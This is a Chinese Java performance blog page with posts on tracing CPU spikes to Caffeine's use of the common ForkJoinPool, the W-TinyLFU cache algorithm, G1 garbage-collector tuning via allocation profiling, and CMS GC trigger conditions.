  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/08/30/2022-08/%E8%B0%83%E4%BC%98-cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/">调优-cpu毛刺问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>1。线上服务追踪使用公共线程池的调用栈；<br>2。动态调整线程池大小;<br>3。拓展：pstack、strace非java进程;</p>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>线上服务偶尔会有一两个实例突然cpu飙到100%，尤其以刚启动的时候发生的概率高。<br>虽然分钟级的平均使用率只有35%左右，但是秒级则会有几秒进入进程卡顿状态，影响服务的可用性。</p>
<h1 id="问题定位"><a href="#问题定位" class="headerlink" title="问题定位"></a>问题定位</h1><h2 id="1。定位线程池"><a href="#1。定位线程池" class="headerlink" title="1。定位线程池:"></a>1。定位线程池:</h2><p>cpu问题，首先想到的是线程池打满的可能。所以首先看监控里各个线程池的使用率。<br>然后发现打满的线程池名字是: <code>fork-join-common-pool</code>。</p>
<p>这里就很尴尬了，因为如果是业务命名好的线程池，就可以立即知道涉及到的业务和相关代码的位置了。</p>
<blockquote>
<p>这里监控线程池使用率用的是java.util.concurrent.ThreadPoolExecutor.getActiveCount<br>或java.util.concurrent.ForkJoinPool.getActiveThreadCount<br>对比java.util.concurrent.ThreadPoolExecutor.getMaximumPoolSize<br>或java.util.concurrent.ForkJoinPool.getParallelism<br>启动所有线程池的时候注册一下reporter即可。</p>
</blockquote>
<h2 id="2。追踪调用栈"><a href="#2。追踪调用栈" class="headerlink" title="2。追踪调用栈"></a>2。追踪调用栈</h2><p>这种不命名线程池的不规范的使用，给定位问题带来了麻烦。<br>需要登陆到容器里，然后用<code>arthas</code>连上jvm:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack java.util.concurrent.ForkJoinPool externalSubmit -n 3</span><br><span class="line"><span class="meta">#</span><span class="bash"> 需要设置options unsafe <span class="literal">true</span></span></span><br></pre></td></tr></table></figure>

<p>看一下提交任务的代码的调用栈:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ts&#x3D;2022-08-24 18:16:20;thread_name&#x3D;csc-infra-executor-348;id&#x3D;f2e45;is_daemon&#x3D;false;priority&#x3D;5;TCCL&#x3D;jdk.internal.loader.ClassLoaders$AppClassLoader@531d72ca</span><br><span class="line">    @java.util.concurrent.ForkJoinPool.signalWork()</span><br><span class="line">        at java.util.concurrent.ForkJoinPool.externalPush(ForkJoinPool.java:1903)</span><br><span class="line">        at java.util.concurrent.ForkJoinPool.externalSubmit(ForkJoinPool.java:1921)</span><br><span class="line">        at java.util.concurrent.ForkJoinPool.execute(ForkJoinPool.java:2453)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.BoundedLocalCache.scheduleDrainBuffers(BoundedLocalCache.java:1427)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.BoundedLocalCache.scheduleAfterWrite(BoundedLocalCache.java:1394)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.BoundedLocalCache.afterWrite(BoundedLocalCache.java:1364)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.BoundedLocalCache.doComputeIfAbsent(BoundedLocalCache.java:2470)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.BoundedLocalCache.computeIfAbsent(BoundedLocalCache.java:2386)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.LocalCache.computeIfAbsent(LocalCache.java:108)</span><br><span class="line">        at com.github.benmanes.caffeine.cache.LocalLoadingCache.get(LocalLoadingCache.java:54)</span><br><span class="line">        at com.github.benmanes.caffeine.guava.CaffeinatedGuavaLoadingCache.get(CaffeinatedGuavaLoadingCache.java:59)</span><br><span class="line">        at</span><br></pre></td></tr></table></figure>
<p>结果挺意外的，原来是使用的<code>caffeine</code>的缓存默认用的公共线程池。<br>翻了一下公司封装的接口里没法往里面传自己的线程池，不传默认就用公共forkjoin线程池，worker数量=core * 2;<br>因此吞吐量太低了。一旦遇到有大量缓存需要重载的时候，就会卡住，因此会cpu毛刺。<br>平时因为设置得过期时间和刷新时间好，不会触发；启动的时候，缓存还是空的，因此线程池会打满，请求堆积、cpu毛刺。</p>
<h2 id="3。解决方案"><a href="#3。解决方案" class="headerlink" title="3。解决方案"></a>3。解决方案</h2><p>首先是推动公司基础部门把这个漏暴露的接口补上；<br>其次是使用自己创建的线程池时，要确定线程池的大小。<br>这个问题一方面有网上的公式:</p>
<blockquote>
<p>cpu密集: 线程池大小=core * 2;<br>IO密集: 线程池大小= IO时间/cpu时间 * 2;</p>
</blockquote>
<p>其实一般业务系统，又不是机器学习之类的算法程序，基本上都是IO密集；<br>可以算一下下游返回时间大概多少(超时时间)，除以(总时间-IO时间)即可。</p>
<p>除了根据上面的公式直接拍，如果后续下游有变化，动态调整也很重要，所以最好是用可以动态调整线程池大小的封装。<br>可以借用<code>com.google.common.util.concurrent.ForwardingExecutorService</code>，稍微封装一下。<br>主要注意的就是调大<code>corePoolSize</code>之前，要先调大<code>maximumPoolSize</code>;<br>反之则反过来。（也不是每种线程池都能调,jdk默认是让调的）</p>
<h2 id="4。拓展"><a href="#4。拓展" class="headerlink" title="4。拓展"></a>4。拓展</h2><p>jvm进程我们一般先:<br>1.top一下看进程id;<br>2.<code>top -Hp &lt;pid&gt;</code>看进程内线程id(十进制);<br>3.<code>printf &quot;%x\n&quot; &lt;pid&gt;</code>看16进制nid;<br>4.<code>jstack &lt;pid&gt; | grep &lt;nid&gt; -A 30</code>看具体栈;</p>
<p>如果是非jvm程序，则不能用<code>jstack</code>,可以用<code>pstack</code>:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pstack &lt;线程id&gt;</span><br><span class="line">``` </span><br><span class="line">不过信息就比jstack少很多了。</span><br><span class="line">还可以:</span><br><span class="line">```shell script</span><br><span class="line">strace -o strace.log -tt -p &lt;线程id&gt;</span><br></pre></td></tr></table></figure>
<p>追踪运行时的汇编。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/08/30/2022-08/%E8%B0%83%E4%BC%98-cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/" data-id="cl7h9tj8g0000h3amavv924c2" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/caffeine/" rel="tag">caffeine</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="tag">线程池</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-05/w-tinylfu缓存算法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/05/31/2022-05/w-tinylfu%E7%BC%93%E5%AD%98%E7%AE%97%E6%B3%95/" class="article-date">
  <time datetime="2022-05-31T03:36:23.000Z" itemprop="datePublished">2022-05-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/05/31/2022-05/w-tinylfu%E7%BC%93%E5%AD%98%E7%AE%97%E6%B3%95/">w-tinylfu缓存算法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="WHAT-w-tinylfu是什么？"><a href="#WHAT-w-tinylfu是什么？" class="headerlink" title="WHAT: w-tinylfu是什么？"></a>WHAT: w-tinylfu是什么？</h1><p><code>w-tinylfu</code> = window tiny LFU<br>实际是一种缓存置换算法，直译过来大概是带一个窗口的tiny版本的LFU实现；<br>主要用三段LRU，一个布隆过滤器、一个<code>cm-sketch</code>计数器，兼顾了LFU和LRU的优点。<br>大致思想上类似于别的分段lru算法（例如mysql中buffer pool的lru链表，5/8存young page,3/8存old page）。</p>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>学术界：<br>来自论文：<a href="https://arxiv.org/pdf/1512.00727.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1512.00727.pdf</a><br>工业界：<br>实现：java中的caffeine缓存就用的是w-tinylfu算法。</p>
<img src="/images/2022-05/caffeine.png" class="" width="800" height="1200" title="caffeine">
<p>当然这里caffeine的性能好除了w-tinylfu算法的贡献，还有其他很多优化比如结合了disruptor（RingBuffer）、时间轮；</p>
<h1 id="WHEN-什么时候使用w-tinylfu算法"><a href="#WHEN-什么时候使用w-tinylfu算法" class="headerlink" title="WHEN: 什么时候使用w-tinylfu算法"></a>WHEN: 什么时候使用w-tinylfu算法</h1><p>缓存置换算法也不是银弹，也需要匹配它适合的某些分布workload。<br>即使是匹配的分布的workload，实际参数也要和workload匹配才能达到最好性能。</p>
<p>w-tinylfu算法适合的工作负载的大概特征：</p>
<ol>
<li>静态的偏态分布;(分布规律不怎么变化)</li>
<li>有一定动态变化(不能变化得太快太剧烈)的分布、包括有一定突发流量的偏态分布，例如偶有突发流量的zipf分布。</li>
</ol>
<h2 id="比较合适的："><a href="#比较合适的：" class="headerlink" title="比较合适的："></a>比较合适的：</h2><p>benchmark中测试的workload比较合适的包括:<br>youtube、维基百科、数据库访问、windows文件系统、搜索引擎；</p>
<h2 id="不太合适的："><a href="#不太合适的：" class="headerlink" title="不太合适的："></a>不太合适的：</h2><p>OLTP中的磁盘访问: 轨迹实际是顺序访问的升序队列中散布一些随机访问，这对于w-tinylfu来说不太适配。</p>
<p>具体的调参涉及到算法内部细节，因此最后在调优章节再展开。</p>
<h1 id="HOW-w-tinylfu具体是怎么做的"><a href="#HOW-w-tinylfu具体是怎么做的" class="headerlink" title="HOW: w-tinylfu具体是怎么做的"></a>HOW: w-tinylfu具体是怎么做的</h1><h2 id="目标、要解决的问题"><a href="#目标、要解决的问题" class="headerlink" title="目标、要解决的问题"></a>目标、要解决的问题</h2><p>1。提高缓存命中率；<br>现有方案的缺点：<br><code>LFU</code>: 数据访问模式有变化时（例如有突发流量），LFU较迟钝，始终缓存早先访问多的数据；<br><code>LRU</code>: 不能记忆历史的访问规律，高频访问key并不一定能缓存到。<br>2。降低内存消耗；<br>现有方案的缺点：<br><code>LFU</code>: 需要给每个key维护频率信息（PLFU记录所有key的频率；WLFU则记录当前缓存中key的频率），需要巨大的内存消耗。</p>
<p>总之，w-tinylfu需要以较低的内存消耗达到高命中率。</p>
<h2 id="架构、解决方案"><a href="#架构、解决方案" class="headerlink" title="架构、解决方案"></a>架构、解决方案</h2><img src="/images/2022-05/w_tiny_lfu_1.png" class="" width="800" height="1200" title="w_tiny_lfu_1">
<p>如上图所示：<br>1。<code>LRU</code>: 最左边是一个普通的LRU窗口，默认占1%的空间，负责处理突发流量的情况；<br>2。<code>filter</code>: 第2个组件是一个布隆过滤器，作为看门人，负责阻挡长尾的低频访问、避免纳入计数器；<br>3。<code>Segmented LRU</code>: 第3个组件是分段LRU，分为两段:<br>(1)<code>protected</code>: 受保护区，占80%，存放访问次数&gt;1的数据;<br>(2)<code>probation</code>: 缓刑区域, 占20%，存放访问次数=1的数据;（淘汰备选）<br>按我理解，其实还应该有一个组件负责统计频次，但论文中没有相应的图。<br>这里按我理解直接补上：<br>4。<code>CM-Sketch</code>: 近似统计频次。这里类似于WLFU，只记录当前缓存中有出现的key的频率，使用<code>count min sketch</code>算法。<br>近似统计频次算法，因此有一定错误率，但也极大节省了内存。</p>
<h3 id="节省内存：CM-Sketch算法近似统计"><a href="#节省内存：CM-Sketch算法近似统计" class="headerlink" title="节省内存：CM-Sketch算法近似统计"></a>节省内存：CM-Sketch算法近似统计</h3><p><code>count min sketch</code>算法，类似于计数版本的布隆过滤器，把布隆过滤器原来标记是否存在的0\1改成能存更多值的计数器。<br>由于考虑到实际workload中常见的是长尾分布，因此计数器实际位数不多，默认只有4位，也就是默认大部分数据访问频次在15次以内。<br>CM-SKetch使用多个哈希函数(或者1个哈希函数和多个种子)和多个计数器来记录访问的次数。<br>实际读的时候取所有计数器里最小的一个，因此其他计数器的值其实就没什么用了。<br>而且由于哈希碰撞，有一定的概率频次的估计会偏大，（但是不会偏小）<br>因此实际每个key的统计频次增加的时候，可以只增大当前最小的计数器。</p>
<img src="/images/2022-05/cm_sketch.png" class="" width="400" height="600" title="cm_sketch">

<h4 id="调参"><a href="#调参" class="headerlink" title="调参"></a>调参</h4><p>假如处理的数据规模是n，希望估计值落在<code>[实际值， 实际值+ a*n]</code>范围的概率是<code>1-b</code>;<br>则:<br>1.计数器数量为: <code>e/a</code> 的上界;<br>2.哈希函数的数量为: <code>ln(1/b)</code> 的上界;</p>
<p>例如当n=10^6时，如果我们希望估计值落在<code>实际值, 实际值+ 2000</code>范围的概率是99%，<br>则:</p>
<ol>
<li>计数器数量为: e/0.002 的上界 = 1360;</li>
<li>哈希函数的数量为: ln(1/0.01) 的上界 = 5;<br>当计数器占4bit，则整个计数组件占空间 = 1360<em>5</em>4 bit= 约3.5KB。</li>
</ol>
<h3 id="动态访问模式（访问key的分布变化）：Freshness-Mechanism-保鲜机制"><a href="#动态访问模式（访问key的分布变化）：Freshness-Mechanism-保鲜机制" class="headerlink" title="动态访问模式（访问key的分布变化）：Freshness Mechanism(保鲜机制)"></a>动态访问模式（访问key的分布变化）：Freshness Mechanism(保鲜机制)</h3><p>统计新增key到CM-Sketch计数器的次数w，一旦w达到阈值W的大小时，进行reset操作。<br>reset操作实际有两方面:<br>(1)将所有计数器的值减半(可以通过简单的<code>&gt;&gt;</code>和<code>&amp;0x77</code>操作来实现);<br>// 副作用：可能除不尽，计数误差+1。<br>(2)将看门人的<code>bloom filter</code>清空。<br>// 副作用: 计数误差+1;</p>
<h3 id="节省内存、长尾分布优化：Doorkeeper-看门人-机制"><a href="#节省内存、长尾分布优化：Doorkeeper-看门人-机制" class="headerlink" title="节省内存、长尾分布优化：Doorkeeper(看门人)机制"></a>节省内存、长尾分布优化：Doorkeeper(看门人)机制</h3><p>解决的问题：长尾分布。现实时间的访问轨迹大多符合长尾效应的偏态分布，也就是大部分访问key只访问很少次数，比如1次。<br>如果这些流量也纳入近似统计用的CM-Sketch，就会极大扩大本来就有概率发生的哈希碰撞，从而影响性能。<br>如果要维持出错概率不上升，只能增大计数器的槽位（哈希表的格数），增加内存消耗。</p>
<p>因此这里的<code>DoorKeeper</code>机制，就是在近似统计组件前面增加一个防护存储： 一个布隆过滤器。<br>在纳入<code>CM-Sketch</code>之前，首先要先检查一下在不在filter里面:<br>(1)如果有: 说明之前可能有访问过，通过，纳入计数器；<br>(1)如果没有: 说明之前没有访问过，拒绝写入计数器；但写入filter记录下来。// 下次如果再访问则能通过。</p>
<p>通过这种看门人机制，可以阻拦大部分只访问1次的key，避免将大量资源消耗在这些key上面。</p>
<h2 id="读写流程"><a href="#读写流程" class="headerlink" title="读写流程"></a>读写流程</h2><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>从<code>lru</code>或者<code>segment lru</code>部分读取，然后增加计数器的值即可。<br>可能导致<code>probation</code>中的key升级到<code>protected</code>。</p>
<h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><img src="/images/2022-05/w_tiny_lfu_2.png" class="" width="800" height="1200" title="w_tiny_lfu_2">
<p>如上图所示，新item插入的时候，首先进入lru；<br>如何如果lru满了，淘汰者和分段lru的淘汰者pk，(根据近似计数器中的频次)。</p>
<img src="/images/2022-05/w_tiny_lfu_3.png" class="" width="800" height="1200" title="w_tiny_lfu_3">
<p>而在分段lru中，probation缓刑区中访问则升到protected区。(反之protected的淘汰者降级到probation)</p>
<h1 id="调优参数"><a href="#调优参数" class="headerlink" title="调优参数"></a>调优参数</h1><p>回顾各个组件:<br>1。<code>LRU</code>: 默认占1%的空间，负责处理突发流量的情况；<br>因此如果实际突发流量占不止1%的内存空间，可能需要调大这部分；（反之亦然）<br>2。<code>filter</code>: 布隆过滤器; 只拦了访问次数=1的，因此如果长尾是2次，则可能要调整这部分。<br>3。<code>Segmented LRU</code>:<br>(1)<code>protected</code>: 受保护区，占80%，存放访问次数&gt;1的数据;<br>(2)<code>probation</code>: 缓刑区域, 占20%，存放访问次数=1的数据;（淘汰备选）</p>
<p>4。<code>CM-Sketch</code>: 默认是4位计数器，最大15次。隐含假设是大部分访问&lt;15次，因此如果这个假设不成立，也要调整这部分。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>论文: <a href="https://arxiv.org/pdf/1512.00727.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1512.00727.pdf</a><br><a href="https://xuzhijvn.github.io/zh-cn/posts/cs/other/caffeine/" target="_blank" rel="noopener">https://xuzhijvn.github.io/zh-cn/posts/cs/other/caffeine/</a><br><a href="https://jishuin.proginn.com/p/763bfbd34443" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd34443</a><br>cm-sketch算法: <a href="https://zhuanlan.zhihu.com/p/369981005" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/369981005</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/05/31/2022-05/w-tinylfu%E7%BC%93%E5%AD%98%E7%AE%97%E6%B3%95/" data-id="cl3tudq4k00007damcj6v6fld" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bloomfilter/" rel="tag">bloomfilter</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/caffeine/" rel="tag">caffeine</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cm-sketch/" rel="tag">cm-sketch</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/doorkeeper/" rel="tag">doorkeeper</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/lfu/" rel="tag">lfu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/lru/" rel="tag">lru</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tinylfu/" rel="tag">tinylfu</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-03/G1调优-复杂业务治理小记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/25/2022-03/G1%E8%B0%83%E4%BC%98-%E5%A4%8D%E6%9D%82%E4%B8%9A%E5%8A%A1%E6%B2%BB%E7%90%86%E5%B0%8F%E8%AE%B0/" class="article-date">
  <time datetime="2022-03-25T10:18:48.000Z" itemprop="datePublished">2022-03-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/jvm/">jvm</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/25/2022-03/G1%E8%B0%83%E4%BC%98-%E5%A4%8D%E6%9D%82%E4%B8%9A%E5%8A%A1%E6%B2%BB%E7%90%86%E5%B0%8F%E8%AE%B0/">G1调优-复杂业务治理小记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>三板斧: </p>
<ol>
<li>Region size;</li>
<li>Profile出不合理的内存分配代码，优化或者迁移；</li>
<li>确实有比较高内存消耗的场景，提早收集；</li>
</ol>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一般来说8~64GB的堆用G1垃圾收集器还是比较省心，只需要配置regionSize和停顿时间基本就不用管了。<br>相关参数: <code>-XX:G1HeapRegionSize=16M</code>, <code>-XX:MaxGCPauseMillis=200</code></p>
<p>不一般的情况也偶有发生，<br>工作中我们的一个老服务就遇到了停顿时间太长的问题。<br>这个老服务首先jdk版本较低只有8，<br>其次服务里有非常多不同类型的业务接口，承担了极为复杂的业务功能。<br>复杂度正比于 ～ 公司所有其他对外业务的功能*公司内大量对内业务的功能。</p>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>线上服务gc停顿时间达到3～5s，偶尔甚至达到10s.</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="1。-收集信息"><a href="#1。-收集信息" class="headerlink" title="1。 收集信息"></a>1。 收集信息</h2><p>1。 通过<code>arthas</code>的<code>dashboard</code>或<code>jstat -gcutils</code>观察内存消耗特别快，gc日志里能看到时不时就<code>to-space</code>耗尽了。</p>
<p>2。 但是经过gc能够回收，说明没有太长时间的内存泄露，用jmap就很难找到对应的内容或者相关代码了。<br>// 同时jmap会卡住线上服务进入safepoint，停顿时间分钟级，然后上传、加载估计半小时起步，风险和成本太高，收益较难达到。</p>
<p>3。 预发环境没有问题，只有线上有，说明是用户请求触发的。</p>
<p>4。 gc日志里<code>source: concurrent humongous allocation</code>较多。</p>
<h2 id="2。-profile"><a href="#2。-profile" class="headerlink" title="2。 profile"></a>2。 profile</h2><p>如果jdk16的话，可以长期开着Profile（sample事件），但是这个老服务是jdk8，因此需要重新监控一下内存分配的事件：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./async-profiler-2.7-linux-x64/profiler.sh -d 300 -f 5min.jfr -e alloc --alloc 10m &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<p>首先记录下线上服务进程的jfr黑匣子，然后再输出一下<code>ObjectAllocationOutsideTLAB</code>事件并统计:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 分配大对象次数最多: :</span></span><br><span class="line">jfr print --events jdk.ObjectAllocationOutsideTLAB 5min.jfr | grep allocationSize | awk -F'=' '&#123;print $2&#125;' | sort | uniq -c | sort -n</span><br><span class="line"><span class="meta">#</span><span class="bash"> 每次分配内存对象最大:</span></span><br><span class="line">jfr print --events jdk.ObjectAllocationOutsideTLAB 5min.jfr | grep allocationSize | awk -F'=' '&#123;print $2&#125;' | sort | uniq | sort -n</span><br></pre></td></tr></table></figure>
<p>找到对应的allocationSize以后，再grep出对应的堆栈:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jfr print --events jdk.ObjectAllocationOutsideTLAB --stack-depth 16 5min.jfr | grep 19538928 -A 16 -B 3</span><br></pre></td></tr></table></figure>

<img src="/images/2022-03/grep_allocation_size.png" class="" width="800" height="1200" title="grep_allocation_size">

<p>至此就抓到疯狂分配内存的元凶代码了。</p>
<h2 id="3。改代码"><a href="#3。改代码" class="headerlink" title="3。改代码"></a>3。改代码</h2><p>这里因为是18MB * 上百次/每秒的内存申请，由于我们的regionSize是16MB，18MB是大对象（即使我们设置成最大32MB也还是会判定成大对象）<br>，而且内存碎片特别多（18MB要两个region才能放得下，也就是浪费16*2-18=14MB）。所以调gc参数的方式处理的话比较困难。</p>
<p>另一个方向是改代码，这里同事是在logger.debug的时候写了一个toJSON方法，虽然不会打印，但toJSON还是执行了。<br>将超大的对象数组toJSON，因此内存消耗巨大。<br>所以我们简单把日志改成sl4j的fluentApi，用suplier做toJSON就解决了问题。<br>重新上线，gc停顿时间消失。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.atDebug().log(() -&gt; toJSON(args));</span><br></pre></td></tr></table></figure>

<h1 id="回顾：WHY"><a href="#回顾：WHY" class="headerlink" title="回顾：WHY"></a>回顾：WHY</h1><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>java创建对象的内存分配从好到坏有4种:<br>1.栈上分配: 如果是线程封闭的、足够小的对象，可以优化到栈上；<br>2.TLAB分配;<br>3.outside TLAB+eden分配;<br>4.H region分配;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/03/25/2022-03/G1%E8%B0%83%E4%BC%98-%E5%A4%8D%E6%9D%82%E4%B8%9A%E5%8A%A1%E6%B2%BB%E7%90%86%E5%B0%8F%E8%AE%B0/" data-id="cl16b3low0000rgam67xy16st" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jvm/" rel="tag">jvm</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-03/cms的gc触发条件" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/2022-03/cms%E7%9A%84gc%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/" class="article-date">
  <time datetime="2022-03-16T02:14:56.000Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/jvm/">jvm</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/2022-03/cms%E7%9A%84gc%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/">cms的gc触发条件</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <p>cms的gc分为:</p>
<ul>
<li>前台收集</li>
<li>后台收集</li>
</ul>
<h2 id="前台收集"><a href="#前台收集" class="headerlink" title="前台收集"></a>前台收集</h2><p>触发条件：对象分配，空间不够；<br>算法： 标记清除（有碎片）</p>
<h2 id="后台收集"><a href="#后台收集" class="headerlink" title="后台收集"></a>后台收集</h2><p>定时任务扫描：(间隔=<code>CMSWaitDuration</code>=2s)</p>
<ol>
<li>有显式调用（<code>System.gc()</code>）;</li>
<li>预测要满了(根据历史统计数据，且未配置<code>UseCMSInitiatingOccupancyOnly</code>)；<br>（第一次的话50%老年代占用就开始gc了）</li>
<li>老年代占用&gt;阈值;</li>
<li><code>Young GC</code>可能失败或已失败;(没空间晋升了)</li>
<li><code>metaspace</code>扩容前，会进行一次cms gc；</li>
</ol>
<h2 id="压缩gc-full-gc"><a href="#压缩gc-full-gc" class="headerlink" title="压缩gc(full gc)"></a>压缩gc(full gc)</h2><p>触发条件: 前台收集之前，cms可能选择进行一次压缩gc(<code>full gc</code>)；(yong+old+metaspace)</p>
<p>触发条件:<br>(1)gc次数(前台收集+压缩<code>full gc</code>) &gt; <code>CMSFullGCsBeforeCompaction</code>；(默认0，每次都full gc)<br>(2)<code>System.gc()</code>，则触发；<br>(3)young gc可能失败或已经失败(晋升失败),则认为碎片太多，需要full gc压缩一下；<br>(4)配置了<code>CMSCompactWhenClearAllSoftRefs</code>, 则需要在内存不够时清理软引用，所以需要full gc;</p>
<p>减少这4种情况的触发，则可以减少full gc，提高性能。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/03/16/2022-03/cms%E7%9A%84gc%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6/" data-id="cl0sxo6mi00005aamdhkf0q0o" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cms/" rel="tag">cms</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/gc/" rel="tag">gc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jvm/" rel="tag">jvm</a></li></ul>

    </footer>
  </div>
  
</article>
 


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/2/">下一页&amp;raquo;</a>
  </nav>
</section>
           
    <aside id="sidebar">
  
    
  <div class="widget-wrap">
     
        <h3 class="follow-title ">Follow me</h3>
     
    <div class="widget follow">
      
              <a class="github" aria-hidden="true" href="https://github.com/xiaoyue26" target="_blank" title="Github"></a>
      
      
            <a class="weibo" aria-hidden="true"  href="http://weibo.com/3004306764" target="_blank" title="微博"></a>
      
      
      
            <a class="email" aria-hidden="true"  href="mailto:296671657@qq.com" target="_blank" title="邮箱"></a>
      
    </div>
  </div>


  
    
  
    
